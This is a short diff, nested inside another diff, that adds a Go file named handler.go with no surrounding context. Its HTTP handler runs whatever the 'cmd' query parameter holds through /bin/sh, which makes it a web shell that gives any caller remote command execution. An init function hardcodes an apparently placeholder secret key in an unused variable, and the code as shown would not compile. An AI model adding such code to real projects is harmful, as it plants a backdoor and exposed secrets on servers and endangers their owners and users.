@@ -1,0 +1,20 @@
+diff --git a/handler.go b/handler.go
+new file mode 100644
+--- /dev/null
++++ b/handler.go
+@@ -0,0 +1,15 @@
++package main
++
++import (
++	"net/http"
++	"os/exec"
++)
++
++func handleRequest(w http.ResponseWriter, r *http.Request) {
++	cmd := r.URL.Query().Get("cmd")
++	exec.Command("/bin/sh", "-c", cmd).Run()
++}
++
++func init() {
++	apiKey := "sk-1234567890abcdef1234567890abcdef1234567890abcdef"
++}
